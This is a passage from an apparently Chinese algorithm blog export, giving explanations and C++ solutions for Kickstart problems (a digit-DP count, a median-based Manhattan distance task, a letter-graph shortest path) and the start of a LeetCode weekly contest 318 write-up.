<li>求$X_{equal}$稍微复杂点，我们设<code>dp[i][0]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>相等且为<code>boring number</code>的个数，这个其实很简单，要么为<code>0</code>,要么为<code>1</code>；设<code>dp[i][1]</code>表示字符的长度为<code>i</code>,且前<code>i</code>的数字与<code>x</code>不相等且为<code>boring number</code>的个数，则此时:<br>$$<br>dp[i][1] &#x3D; dp[i-1][1]<em>5 + dp[i-1][0]</em>(X[i]&#x2F;2) \<br>X_{equal} &#x3D; dp[n][0] + dp[n][1] \<br>count[x] &#x3D; \sum_{i&#x3D;1}^{n-1}5^{i} + dp[n][0] + dp[n][1] \<br>$$</li>
</ul>
<h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> cnt[<span class="number">20</span>];</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> dp[<span class="number">20</span>][<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">count</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(n &lt;= <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; arr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> x = n; x != <span class="number">0</span>; x = x/<span class="number">10</span>)&#123;</span><br><span class="line">        arr.<span class="built_in">push_back</span>(x%<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">reverse</span>(arr.<span class="built_in">begin</span>(),arr.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; arr.<span class="built_in">size</span>(); ++i)&#123;</span><br><span class="line">        ans += cnt[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> m = arr.<span class="built_in">size</span>();</span><br><span class="line">    <span class="built_in">memset</span>(dp,<span class="number">0</span>,<span class="built_in">sizeof</span>(dp));</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    dp[<span class="number">0</span>][<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= m; ++i)&#123;</span><br><span class="line">        <span class="comment">/*upper*/</span></span><br><span class="line">        <span class="keyword">if</span>((arr[i<span class="number">-1</span>]%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">0</span>] = dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">else</span> dp[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">/*lower*/</span></span><br><span class="line">        <span class="keyword">if</span>(i  &gt; <span class="number">1</span>) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">1</span>]*<span class="number">5</span>;</span><br><span class="line">        <span class="keyword">if</span>(i == <span class="number">1</span>)&#123;</span><br><span class="line">            dp[i][<span class="number">1</span>] += arr[i<span class="number">-1</span>]/<span class="number">2</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; arr[i<span class="number">-1</span>]; ++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>((j%<span class="number">2</span>) == (i%<span class="number">2</span>)) dp[i][<span class="number">1</span>] += dp[i<span class="number">-1</span>][<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans += dp[m][<span class="number">0</span>];</span><br><span class="line">    ans += dp[m][<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> l,r;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    cin&gt;&gt;l&gt;&gt;r;</span><br><span class="line">    ans = <span class="built_in">count</span>(r) - <span class="built_in">count</span>(l<span class="number">-1</span>);</span><br><span class="line">    <span class="comment">//cout&lt;&lt;count(r)&lt;&lt;&quot;:&quot;&lt;&lt;count(l-1)&lt;&lt;endl;</span></span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cnt[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">18</span>; ++i)&#123;</span><br><span class="line">        cnt[i] = cnt[i<span class="number">-1</span>]*<span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Rugby-1"><a href="#Rugby-1" class="headerlink" title="Rugby"></a>Rugby</h2><p>给定一堆坐标$(x_{i},y_{i})$,求将这些坐标变为一行的最小曼哈顿距离之和:<br>$(X,Y),(X+1,Y),(X+2,Y),(X+3,Y),(X+4,Y)…(X+N,Y)$.</p>
<h3 id="题意-4"><a href="#题意-4" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 中位数。</p>
</blockquote>
<h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ol>
<li>我们仔细观察一下，实际上目标值的<code>(x,y)</code>实际上是独立的，相互之间不影响，则我们可以分别来求出<code>(X,Y)</code>。<br>$$<br>Target &#x3D; min(\sum_{i&#x3D;0}^{n-1}abs(x_{i}-X-i) + \sum_{i&#x3D;0}^{n-1}abs(x_{i}-Y)<br>$$</li>
<li>在已知条件下，我们很容易求出<code>y</code>的值，因为知道要满足距离之和最小的值为中位数。我们对所有坐标的纵坐标按照大小进行排序,<code>Y</code>即为排序后的中位数。<br>$$<br>Y &#x3D; \frac{y_{\frac{n-1}{2}} + y_{\frac{n}{2}}}{2}<br>$$</li>
<li>我们再来求<code>X</code>,我们同样也对<code>x</code>进行排序，我们需要求出$\sum_{i&#x3D;0}^{n-1}abs(x_{i}-X-i)$的最小值，实际上可以转为$\sum_{i&#x3D;0}^{n-1}abs((x_{i}-i) -X)$的最小值，因此我们此时构造数组：<br>$$<br>(x_{0},x_{1}-1,x_{2}-2,x_{3}-3…,x_{n}-n)<br>$$<br>此时求最小距离之和可以转换为求中位数即可，满足题目要求，此时我们相当于求上述转化数组的中位数。</li>
</ol>
<h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> midx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> midy = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">arrx</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">arry</span><span class="params">(n)</span></span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        cin&gt;&gt;arrx[i]&gt;&gt;arry[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(arry.<span class="built_in">begin</span>(),arry.<span class="built_in">end</span>());</span><br><span class="line">    <span class="built_in">sort</span>(arrx.<span class="built_in">begin</span>(),arrx.<span class="built_in">end</span>());</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        arrx[i] -= i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">sort</span>(arrx.<span class="built_in">begin</span>(),arrx.<span class="built_in">end</span>());</span><br><span class="line">    midx = (arrx[(n<span class="number">-1</span>)/<span class="number">2</span>] + arrx[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    midy = (arry[(n<span class="number">-1</span>)/<span class="number">2</span>] + arry[n/<span class="number">2</span>])/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">        ans += <span class="built_in">abs</span>(arrx[i]-midx);</span><br><span class="line">        ans += <span class="built_in">abs</span>(arry[i]-midy);</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h2 id="Friends-1"><a href="#Friends-1" class="headerlink" title="Friends"></a>Friends</h2><h3 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h3><p>给定图，图中的每个节点含有一个字符串，如果两个字符串<code>s,t</code>存在有相同字母，则认为两个节点存在相互连接的边，给定一组查询<code>(x,y)</code>，求节点<code>x</code>与<code>y</code>之间的最短路劲。</p>
<h3 id="题意-5"><a href="#题意-5" class="headerlink" title="题意"></a>题意</h3><blockquote>
<p> 图的遍历</p>
</blockquote>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>题目挺有新意的，如果直接用<code>bfs</code>来遍历图的话，按照图中给定的数据集肯定会超时，所以必须要转换思路。</li>
<li>我们可以转换成求字符<code>a,b</code>的最短距离。我们可以求所所有字符的最短转移路劲，本题也就转化为求所有可能的字符的最短转换路径。</li>
<li>我们假设源字符串为<code>s</code>，目标字符串为<code>t</code>，假如<code>s</code>和<code>t</code>之间存在相同的字符<code>e</code>，则很容易我们知道直接跳一步即可得到结果,<code>chain</code>的最短长度应该为<code>2</code>。<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s-(e)-&gt;t</span><br></pre></td></tr></table></figure>
假如<code>s</code>和<code>t</code>之间是通过不同的字符进行跳转得到的结果，且目标的最短的<code>chain</code>为：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s-(c1)-&gt;s1-(c2)-&gt;s2-(c3)-&gt;s3-&gt;...-&gt;sn-(cn)-&gt;t</span><br></pre></td></tr></table></figure>
根据以上推论我们可以知道如果满足最短的<code>chain</code>，则必然可以得到以下结论:<br>$$<br>c_{1} \neq c_{2} \neq c_{3} \neq c_{4} \neq c_{5} …. \neq c_{n}<br>$$<br>我们假设存在$c_{i} &#x3D; c_{j}$,则我们可以判定直接可以通过<code>i</code>跳转到<code>j</code>即可，而不必再通过$c_{i+1},c_{i+2},…,c_{j-1}$进行跳转,因此我们只需求出不同字符之间跳转的最短距离即可。我们可以设相同字符的跳转距离为<code>0</code>.</li>
<li>我们可以很容易求出，两个字符串之间的字符跳转的最短转换距离，最终的答案为$minJump + 2$.</li>
</ol>
<h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="type">int</span>,<span class="type">int</span>&gt; pii;</span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> ll;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">slove</span><span class="params">(<span class="type">int</span> t)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> n,q;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;q;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">arr</span><span class="params">(n)</span></span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(<span class="number">26</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(<span class="number">26</span>,INF));</span><br><span class="line">    <span class="function">vector&lt;pii&gt; <span class="title">query</span><span class="params">(q)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) cin&gt;&gt;arr[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; q; ++i) cin&gt;&gt;query[i].first&gt;&gt;query[i].second;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i) dp[i][i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> s : arr)&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">count</span><span class="params">(<span class="number">26</span>,<span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> c : s) count[c-<span class="string">&#x27;A&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k)&#123;</span><br><span class="line">                <span class="keyword">if</span>(j == k) <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">if</span>(count[j]&amp;&amp;count[k])&#123;</span><br><span class="line">                    dp[j][k] = <span class="number">1</span>;</span><br><span class="line">                    dp[k][j] = <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; ++i)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">26</span>; ++j)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; ++k)&#123;</span><br><span class="line">                dp[i][k] = <span class="built_in">min</span>(dp[i][k],dp[i][j] + dp[j][k]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> v : query)&#123;</span><br><span class="line">        <span class="type">int</span> x = v.first - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> y = v.second - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> curr = INF;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> a : arr[x])&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">auto</span> b : arr[y])&#123;</span><br><span class="line">                curr = <span class="built_in">min</span>(curr,dp[a-<span class="string">&#x27;A&#x27;</span>][b-<span class="string">&#x27;A&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cout&lt;&lt;(curr == INF ? (<span class="number">-1</span>) : (curr + <span class="number">2</span>))&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; t; ++i)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Case #&quot;</span>&lt;&lt;i+<span class="number">1</span>&lt;&lt;<span class="string">&quot;: &quot;</span>;</span><br><span class="line">        <span class="built_in">slove</span>(i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>kickstart</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  weekly contest 318</title>
    <url>/2022/11/20/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/79/</url>
    <content><![CDATA[<h2 id="leetcode-weekly-contest-318"><a href="#leetcode-weekly-contest-318" class="headerlink" title="leetcode  weekly contest 318"></a>leetcode  weekly contest 318</h2><p>第四题稍微复杂的动态规划，总的来说难度还可以接受。</p>
<h4 id="6229-对数组执行操作"><a href="#6229-对数组执行操作" class="headerlink" title="6229. 对数组执行操作"></a>6229. 对数组执行操作</h4><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <strong>0</strong> 开始的数组 <code>nums</code> ，数组大小为 <code>n</code> ，且由 <strong>非负</strong> 整数组成。</p>
<p>你需要对数组执行 <code>n - 1</code> 步操作，其中第 <code>i</code> 步操作（从 <strong>0</strong> 开始计数）要求对 <code>nums</code> 中第 <code>i</code> 个元素执行下述指令：</p>
<ul>
<li>如果 <code>nums[i] == nums[i + 1]</code> ，则 <code>nums[i]</code> 的值变成原来的 <code>2</code> 倍，<code>nums[i + 1]</code> 的值变成 <code>0</code> 。否则，跳过这步操作。</li>
</ul>
<p>在执行完 <strong>全部</strong> 操作后，将所有 <code>0</code> <strong>移动</strong> 到数组的 <strong>末尾</strong> 。</p>
<ul>
<li>例如，数组 <code>[1,0,2,0,0,1]</code> 将所有 <code>0</code> 移动到末尾后变为 <code>[1,2,1,0,0,0]</code> 。</li>
</ul>
<p>返回结果数组。</p>
<p><strong>注意</strong> 操作应当 <strong>依次有序</strong> 执行，而不是一次性全部执行。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,2,1,1,0]</span><br><span class="line">输出：[1,4,2,0,0,0]</span><br><span class="line">解释：执行以下操作：</span><br><span class="line">- i = 0: nums[0] 和 nums[1] 不相等，跳过这步操作。</span><br><span class="line">- i = 1: nums[1] 和 nums[2] 相等，nums[1] 的值变成原来的 2 倍，nums[2] 的值变成 0 。数组变成 [1,4,0,1,1,0] 。</span><br><span class="line">- i = 2: nums[2] 和 nums[3] 不相等，所以跳过这步操作。</span><br><span class="line">- i = 3: nums[3] 和 nums[4] 相等，nums[3] 的值变成原来的 2 倍，nums[4] 的值变成 0 。数组变成 [1,4,0,2,0,0] 。</span><br><span class="line">- i = 4: nums[4] 和 nums[5] 相等，nums[4] 的值变成原来的 2 倍，nums[5] 的值变成 0 。数组变成 [1,4,0,2,0,0] 。</span><br><span class="line">执行完所有操作后，将 0 全部移动到数组末尾，得到结果数组 [1,4,2,0,0,0] 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0,1]</span><br><span class="line">输出：[1,0]</span><br><span class="line">解释：无法执行任何操作，只需要将 0 移动到末尾。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>2 &lt;= nums.length &lt;= 2000</code></li>
<li><code>0 &lt;= nums[i] &lt;= 1000</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/weekly-contest-318/problems/apply-operations-to-an-array/">https://leetcode.cn/contest/weekly-contest-318/problems/apply-operations-to-an-array/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>简单题目直接模拟即可，对于前后相等的元素将前面的元素变为原来的 $2$ 倍，同时将后一个元素设置为 $0$，之后再进行移动即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">applyOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == nums[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                nums[i] *= <span class="number">2</span>;</span><br><span class="line">                nums[i + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">swap</span>(nums[i], nums[j]);</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="6230-长度为-K-子数组中的最大和题目"><a href="#6230-长度为-K-子数组中的最大和题目" class="headerlink" title="6230. 长度为 K 子数组中的最大和题目"></a>6230. 长度为 K 子数组中的最大和题目</h4><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个整数数组 <code>nums</code> 和一个整数 <code>k</code> 。请你从 <code>nums</code> 中满足下述条件的全部子数组中找出最大子数组和：</p>
<ul>
<li>子数组的长度是 <code>k</code>，且</li>
<li>子数组中的所有元素 <strong>各不相同 。</strong></li>
</ul>
<p>返回满足题面要求的最大子数组和。如果不存在子数组满足这些条件，返回 <code>0</code> 。</p>
<p><strong>子数组</strong> 是数组中一段连续非空的元素序列。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,5,4,2,9,9,9], k = 3</span><br><span class="line">输出：15</span><br><span class="line">解释：nums 中长度为 3 的子数组是：</span><br><span class="line">- [1,5,4] 满足全部条件，和为 10 。</span><br><span class="line">- [5,4,2] 满足全部条件，和为 11 。</span><br><span class="line">- [4,2,9] 满足全部条件，和为 15 。</span><br><span class="line">- [2,9,9] 不满足全部条件，因为元素 9 出现重复。</span><br><span class="line">- [9,9,9] 不满足全部条件，因为元素 9 出现重复。</span><br><span class="line">因为 15 是满足全部条件的所有子数组中的最大子数组和，所以返回 15 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,4,4], k = 3</span><br><span class="line">输出：0</span><br><span class="line">解释：nums 中长度为 3 的子数组是：</span><br><span class="line">- [4,4,4] 不满足全部条件，因为元素 4 出现重复。</span><br><span class="line">因为不存在满足全部条件的子数组，所以返回 0 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= k &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 105</code></li>
</ul>
